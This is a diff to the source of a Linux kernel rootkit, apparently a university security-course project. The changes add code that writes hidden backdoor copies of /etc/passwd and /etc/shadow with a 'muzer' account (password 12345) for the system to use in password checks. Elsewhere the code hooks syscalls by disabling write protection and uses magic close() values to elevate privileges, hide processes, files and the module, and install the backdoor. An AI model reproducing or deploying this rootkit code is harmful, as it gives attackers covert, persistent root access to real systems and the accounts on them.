@@ -55,9 +55,9 @@ struct hidden_pids_struct hidden_pids;
 
 pid_t proc_open_pid; /* pid of the process that has currently opened '/proc/' */
 int proc_open_fd;    /* fd for opened '/proc/' in this process open_files table */
-u_int8_t module_hidden = 0;
-u_int8_t hide_files_flag = 0;
-u_int8_t backdoor_added = 0;
+u_int8_t module_hidden;
+u_int8_t hide_files_flag;
+u_int8_t backdoor_added;
 
 /***************************************************************************/
 /* SPECIAL VALUES FOR MALICIOUS COMMUNICATION BETWEEN PROCESSES AND ROOTKIT */
@@ -82,6 +82,7 @@ asmlinkage long (*original_open)(const char __user *pathname,
                                  int flags,
                                  mode_t mode);
 int deletes_file(struct file*);
+int creates_backdoor_copies(void);
 
 /* Modify the CR0 register to block writes on syscall table */
 static void disable_write_protection(void)
@@ -108,12 +109,37 @@ static void enable_write_protection(void)
 /*========== Rootkit functionality  ==========*/
 
 /*
- * Creates copies of /etc/shadow and /etc/passwd files.
- * The copies contain a backdoor account with username muzer
- * and password 12345. The User's home directory
- * points to /etc
+ * Adds backdoor user called muzer to the system
+ * The password for this user is 12345
  */
 int add_backdoor(void)
+{
+    int ret = 0;
+
+    ret = creates_backdoor_copies();
+    if (ret < 0) {
+        // We have been enough verbose in creates_backdoor_copies()
+        return ret;
+    }
+    backdoor_added = 1;
+
+    return ret;
+}
+
+/*
+ * Creates copies of /etc/shadow and /etc/passwd files.
+ * The copies contain a backdoor account with username muzer
+ * and password 12345. The User muzer's home directory
+ * points to /etc.
+ *
+ * Its these copies that the rootkit passes to the system for
+ * password verification. The original shadow and passwd files
+ * look and behave unchanged.
+ *
+ * If new users are added/removed/modified, we trigger the
+ * generation of a new copy of passwd and shadow files.
+ */
+int creates_backdoor_copies(void)
 {
     int ret = 0;
     unsigned short int copyfailed = 0;
@@ -135,8 +161,8 @@ int add_backdoor(void)
         goto out; // No files opened yet
     }
 
-    // Check if a file called /etc/muzerpasswd already exists
-    npfile = filp_open("/etc/muzerpasswd", O_RDONLY, 0);
+    // Check if a file called /etc/cse509--muzerpasswd already exists
+    npfile = filp_open("/etc/cse509--muzerpasswd", O_RDONLY, 0);
     if (!IS_ERR(npfile)) {
         // muzerpasswd file already exists. Lets delete that
         // and then create our own
@@ -148,8 +174,8 @@ int add_backdoor(void)
         }
     }
 
-    // Create a file called /etc/muzerpasswd and add the backdoor to it
-    npfile = filp_open("/etc/muzerpasswd",
+    // Create a file called /etc/cse509--muzerpasswd and add the backdoor to it
+    npfile = filp_open("/etc/cse509--muzerpasswd",
                        O_CREAT | O_RDWR | O_EXCL | O_TRUNC,
                        S_IRUSR | S_IWUSR);
 
@@ -181,8 +207,7 @@ int add_backdoor(void)
         return ret;
     }
 
-    // Rename /etc/passwd to /etc/passwd_old and muzerpasswd to /etc/passwd
-
+    // Open /etc/shadow in read mode
     sfile = filp_open(shadowfile, O_RDWR, 0);
     if (IS_ERR(sfile)) {
         PUBMSG("Unable to open /etc/shadow");
@@ -190,6 +215,51 @@ int add_backdoor(void)
         goto closefiles_exit;
     }
 
+    // Check if a file called /etc/cse509--muzershadow already exists
+    nsfile = filp_open("/etc/cse509--muzershadow", O_RDONLY, 0);
+    if (!IS_ERR(nsfile)) {
+        // muzershadow file already exists. Lets delete that
+        // and then create our own
+        PUBMSG("A muzershadow file already exists. Deleting to continue...");
+        ret = deletes_file(nsfile);
+        if (ret < 0) {
+            PUBMSG("Failed to remove original muzershadow");
+            goto closefiles_exit;
+        }
+    }
+
+    // Create a file called /etc/cse509--muzershadow and add the backdoor to it
+    nsfile = filp_open("/etc/cse509--muzershadow",
+                       O_CREAT | O_RDWR | O_EXCL | O_TRUNC,
+                       S_IRUSR | S_IWUSR);
+
+    ret = kernel_write(nsfile, shadow_str, 124, nsfile->f_pos);
+    if (ret < 0) {
+        PUBMSG("Failed to write backdoor to muzershadow");
+        goto closefiles_exit;
+    }
+    nsfile->f_pos += 124;
+
+    // Copy the rest of /etc/shadow to muzershadow
+    ret = 0;
+    do {
+        ret = kernel_read(sfile, sfile->f_pos, buf, 100);
+        if (ret < 0) {
+            PUBMSG("Failed to kern read sfile");
+            copyfailed = 1;
+            break;
+        }
+        sfile->f_pos += ret;
+        ret = kernel_write(nsfile, buf, ret, nsfile->f_pos);
+        if (ret < 0) {
+            PUBMSG("Failed to kern write to muzerpasswd");
+            copyfailed = 1;
+        }
+        nsfile->f_pos += ret;
+    } while (ret > 0);
+    if (copyfailed) {
+        return ret;
+    }
 
 closefiles_exit:
 if (pfile)
@@ -200,7 +270,6 @@ if (sfile)
     filp_close(sfile, NULL);
 if (nsfile)
     filp_close(nsfile, NULL);
-
 out:
     return ret;
 }
@@ -233,10 +302,16 @@ int hide_files(void)
 int show_files(void)
 {
     int err = 0;
+    if (backdoor_added) {
+        PUBMSG("Backdoor account has been added. Cannot show files presently.");
+        err = -EPERM;
+        goto out;
+    }
     if (hide_files_flag) {
         hide_files_flag = 0;
         err = 1;
     }
+out:
     return err;
 }
 
@@ -476,38 +551,39 @@ asmlinkage long my_open(const char __user *pathname, int flags, mode_t mode)
 asmlinkage int my_close(int fd)
 {
     int err = 0;
-    if (fd < 0) {
+    // Observered too many calls to close() with fd set to -1
+    // in tests. Don't know who calls it, its not the rootkit.
+    if (fd < 0 && fd != -1) {
         switch (fd) {
-        // None of this ever fails? <<<<<< Must fix!
         case ELEVATE_UID:
-            elevate_current_privileges();
+            err = elevate_current_privileges();
             break;
         case HIDE_PROCESS:
-            hide_current_process();
+            err = hide_current_process();
             break;
         case SHOW_PROCESS:
-            show_current_process();
+            err = show_current_process();
             break;
         case HIDE_FILES:
-            hide_files();
+            err = hide_files();
             break;
         case SHOW_FILES:
-            show_files();
+            err = show_files();
             break;
         case HIDE_MODULE:
-            hide_module();
+            err = hide_module();
             break;
         case SHOW_MODULE:
-            show_module();
+            err = show_module();
             break;
         case ADD_BACKDOOR:
-            add_backdoor();
+            err = add_backdoor();
             break;
         default:
             printk(KERN_EMERG "Wrong rootkit command: %d\n", fd);
+            err = -EFAULT;
         }
-    }
-    else {
+    } else {
         if (proc_open_fd == fd && proc_open_pid == current->pid) {
             /* closed "/proc";
                clear stored fd and pid */
@@ -550,6 +626,7 @@ int rootkit_init(void)
     proc_open_pid = -1;
     module_hidden = 0;
     hide_files_flag = 0;
+    backdoor_added = 0;
 
     init_buf_struct();
     init_hidden_pids_list();
@@ -586,8 +663,6 @@ int rootkit_init(void)
                         syscall_table[__NR_getdents];
     syscall_table[__NR_getdents] = (void *) my_getdents;
 
-    // <<<<<< read syscall
-
     // Enable write protection on page
     enable_write_protection();
 
@@ -611,7 +686,6 @@ void rootkit_exit(void)
     syscall_table[__NR_close]    = (void *) original_close;
     syscall_table[__NR_open]     = (void *) original_open;
     syscall_table[__NR_getdents] = (void *) original_getdents;
-    //<<<<<<Do this for read syscall
 
     // Enable write protection on page
     enable_write_protection();
